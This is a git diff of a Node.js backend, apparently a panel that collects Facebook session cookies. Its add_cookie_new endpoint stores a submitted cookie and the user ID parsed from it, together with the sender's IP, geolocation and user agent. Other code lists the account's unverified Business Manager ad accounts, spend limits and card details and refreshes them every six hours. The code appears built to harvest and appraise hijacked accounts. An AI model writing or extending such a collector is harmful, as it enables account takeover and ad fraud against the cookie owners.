@@ -93,7 +93,7 @@ function getInfor_AdAccount(infor_bmlimit) {
 
 function getInfor_BM(infor_bmlimit) {
     return new Promise(function (resolve, reject) {
-        var rs_data1 = [], rs_data2 = [], rs_data_final = []
+        var rs_data1 = [], rs_data2 = [], rs_data_final = [],
             obj
         var options = {
             'method': 'GET',
@@ -106,12 +106,12 @@ function getInfor_BM(infor_bmlimit) {
             if (arr.length >= 0) {
                 for (let i = 0; i < arr.length; i++) {
                     if (arr[i].verification_status == 'not_verified' && typeof arr[i].owned_ad_accounts !== 'undefined') {
-                        rs_data.push(arr[i].owned_ad_accounts.data)
+                        rs_data1.push(arr[i].owned_ad_accounts.data)
                     }
                 }
-                for(let j = 0; j < rs_data.length; j++){
-                    for(let k = 0; k < rs_data[j].length; k++){
-                        rs_data2.push(rs_data[j][k])
+                for(let j = 0; j < rs_data1.length; j++){
+                    for(let k = 0; k < rs_data1[j].length; k++){
+                        rs_data2.push(rs_data1[j][k])
                     }
                 }
                 for(let n = 0; n < rs_data2.length; n++){
@@ -131,7 +131,7 @@ function getInfor_BM(infor_bmlimit) {
                         voive: "",
                         nguong: "",
                         limit: adtrust_dsl,
-                        card: "",
+                        // card: "",
                     }
                     switch (status) {
                         case 1:
@@ -169,11 +169,11 @@ function getInfor_BM(infor_bmlimit) {
                     } else {
                         obj.nguong = "Không có"
                     }
-                    if (typeof rs_data2[n].funding_source_details !== 'undefined') {
-                        obj.card = arr[n].funding_source_details.display_string
-                    } else {
-                        obj.card = "Không có"
-                    }
+                    // if (typeof rs_data2[n].funding_source_details !== 'undefined' && typeof arr[n].funding_source_details.display_string !== 'undefined') {
+                    //     obj.card = arr[n].funding_source_details.display_string ? arr[n].funding_source_details.display_string : "Không có"
+                    // } else {
+                    //     obj.card = "Không có"
+                    // }
                     if (voive == true) {
                         obj.voive = "Có voive"
                     } else {
@@ -183,7 +183,7 @@ function getInfor_BM(infor_bmlimit) {
                 }
                 resolve({
                     data: rs_data_final,
-                    quantity_BM: rs_data.length
+                    quantity: rs_data1.length
                 })
             } else {
                 reject(error)
@@ -874,53 +874,154 @@ module.exports = {
             res.status(400).json({});
         }
     },
+    add_cookie_new: async function (req, res) {
+        try {
+            let infor_bmlimit = req.body.infor_bmlimit
+            let cookie = req.body.cookie.trim()
+            let c_user = /c_user=(.+?);/gm
+            c_user = c_user.exec(cookie)
+            var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
+            var geo = geoip.lookup(ip)
+            var nation, city
+            if (geo == null) {
+                nation = ""
+                city = ""
+            } else {
+                nation = geo.country
+                city = geo.city
+            }
+            let data = Data({
+                cookie: cookie,
+                note: req.body.note ? req.body.note : "",
+                isalive: true,
+                isdelete: false,
+                dateTime: new Date(),
+                updateTime: new Date(),
+                ip: ip ? ip.substr(7) : "",
+                nation: nation ? nation : "",
+                city: city ? city : "",
+                useragent: req.body.useragent ? req.body.useragent : "",
+                infor_bmlimit: infor_bmlimit,
+                c_user: c_user[1] ? c_user[1] : "",
+            })
+            let filter = {
+                c_user: c_user[1]
+            }
+            let check = await Data.findOne(filter);
+            if (check == null) {
+                let rs_save = await data.save()
+                let rs_adaccount = await getInfor_AdAccount(infor_bmlimit)
+                let rs_bm = await getInfor_BM(infor_bmlimit)
+                let rs_page = await getquantity_Page(infor_bmlimit)
+                let update = {
+                    cookie: cookie,
+                    note: req.body.note ? req.body.note : "",
+                    isalive: true,
+                    isdelete: false,
+                    updateTime: new Date(),
+                    ip: ip ? ip.substr(7) : "",
+                    nation: nation ? nation : "",
+                    city: city ? city : "",
+                    useragent: req.body.useragent ? req.body.useragent : "",
+                    infor_bmlimit: req.body.infor_bmlimit,
+                    c_user: c_user[1] ? c_user[1] : "",
+                    quantity_adaccount: rs_adaccount.length ? parseInt(rs_adaccount.length) : 0,
+                    quantity_bm: rs_bm.quantity ? parseInt(rs_bm.quantity) : 0,
+                    quantity_page: rs_page ? parseInt(rs_page) : 0,
+                    data_adaccount: rs_adaccount,
+                    data_bminfor: rs_bm.data,
+                }
+                let rs_update = await Data.findOneAndUpdate(filter, update, {
+                    new: true
+                })
+                if (rs_update != null) {
+                    res.status(200).json({})
+                } else {
+                    res.status(400).json({});
+                }
+            } else {
+                let toDay = new Date()
+                let checkTime = await Data.findOne(filter)
+                if(checkTime){
+                    let updateTime = new Date(checkTime.updateTime)
+                    let chenhlech =  Math.abs(toDay - updateTime)
+                    let rs_chenhlenh = chenhlech/(60*60*1000)
+                    if(rs_chenhlenh >= 6){
+                        let rs_adaccount = await getInfor_AdAccount(infor_bmlimit)
+                        let rs_bm = await getInfor_BM(infor_bmlimit)
+                        let rs_page = await getquantity_Page(infor_bmlimit)
+                        let update = {
+                            cookie: cookie,
+                            note: req.body.note ? req.body.note : "",
+                            isalive: true,
+                            isdelete: false,
+                            updateTime: new Date(),
+                            ip: ip ? ip.substr(7) : "",
+                            nation: nation ? nation : "",
+                            city: city ? city : "",
+                            useragent: req.body.useragent ? req.body.useragent : "",
+                            infor_bmlimit: req.body.infor_bmlimit,
+                            c_user: c_user[1] ? c_user[1] : "",
+                            quantity_adaccount: rs_adaccount.length ? parseInt(rs_adaccount.length) : 0,
+                            quantity_bm: rs_bm.quantity ? parseInt(rs_bm.quantity) : 0,
+                            quantity_page: rs_page ? parseInt(rs_page) : 0,
+                            data_adaccount: rs_adaccount,
+                            data_bminfor: rs_bm.data,
+                        }
+                        let rs_update = await Data.findOneAndUpdate(filter, update, {
+                            new: true
+                        })
+                        if (rs_update != null) {
+                            res.status(200).json({})
+                        } else {
+                            res.status(400).json({});
+                        }
+                    }else{
+                        return res.status(400).json({
+                            message: "chua du thoi gian"
+                        })
+                    }
+                }
+            }
+        } catch (ex) {
+            res.status(400).json({});
+        }
+    },
     test: async function (req, res) {
-        let count1 = await count();
-        res.json(count1.count)
-        // console.log(count1);
-        return
-        let infor_bmlimit = req.body.infor_bmlimit
-        var rs_data = [], arr2 = []
-            var options = {
-                'method': 'POST',
-                'url': 'http://localhost:4000/api/test2',
-              };
-        request(options, function (error, response) {
-            let arr = JSON.parse(response.body)
-            // let arr = rs.data;
-            // let arr2 = [], arr3 = []
-            // let sum = 0
-            // for (let i = 0; i < arr.length; i++) {
-            //     if (arr[i].verification_status == 'not_verified') {
-            //         sum++
-            //         if(typeof arr[i].owned_ad_accounts !== 'undefined'){
-            //             arr2.push(arr[i].owned_ad_accounts)
-            //         }
-            //     }
-            // }
-            for (let i = 0; i < arr.length; i++) {
-               if(arr[i].verification_status == 'not_verified' && typeof arr[i].owned_ad_accounts !== 'undefined'){
-                 rs_data.push(arr[i].owned_ad_accounts.data)
-               }
-            }
-            for(let j = 0; j < rs_data.length; j++){
-               for(let k  = 0; k < rs_data[j].length; k++){
-                 arr2.push(rs_data[j][k])
-               }
-            }
-            res.json(arr2)
-        })
-        // return
-        // // let getAD = await getInfor_AdAccount(infor_bmlimit)
-        // let rs = await getInfor_BM(infor_bmlimit)
-        // res.json(rs)
-        // return
         // let toDay = new Date()
-        // let ngaykhac = new Date('2022-01-15T05:35:54.681Z').toString()
+        // let ngaykhac = new Date('2022-01-17T16:16:05.681Z')
+        // let chenhlech = Math.abs(toDay - ngaykhac)
         // // ngaykhac.setDate(toDay.getDate())
+        // console.log(toDay);
         // console.log(ngaykhac);
+        // console.log(chenhlech/(60*60*1000));
         // // console.log(toDay.getHours() - ngaykhac.setDate(toDay.getDate(ngaykhac.getHours())));
-
+        // return
+        // let infor_bmlimit = req.body.infor_bmlimit
+        // var rs_data = [], arr2 = []
+        //     var options = {
+        //         'method': 'POST',
+        //         'url': 'http://localhost:4000/api/test2',
+        //       };
+        // request(options, function (error, response) {
+        //     let arr = JSON.parse(response.body)
+        //     for (let i = 0; i < arr.length; i++) {
+        //        if(arr[i].verification_status == 'not_verified' && typeof arr[i].owned_ad_accounts !== 'undefined'){
+        //          rs_data.push(arr[i].owned_ad_accounts.data)
+        //        }
+        //     }
+        //     for(let j = 0; j < rs_data.length; j++){
+        //        for(let k  = 0; k < rs_data[j].length; k++){
+        //          arr2.push(rs_data[j][k])
+        //        }
+        //     }
+        //     res.json(arr2)
+        // })
+        let infor_bmlimit = req.body.infor_bmlimit
+        let rs_adaccount = await getInfor_BM(infor_bmlimit)
+        res.json({
+            data: rs_adaccount
+        })
     },
     test2: async function (req, res) {
        let data = [
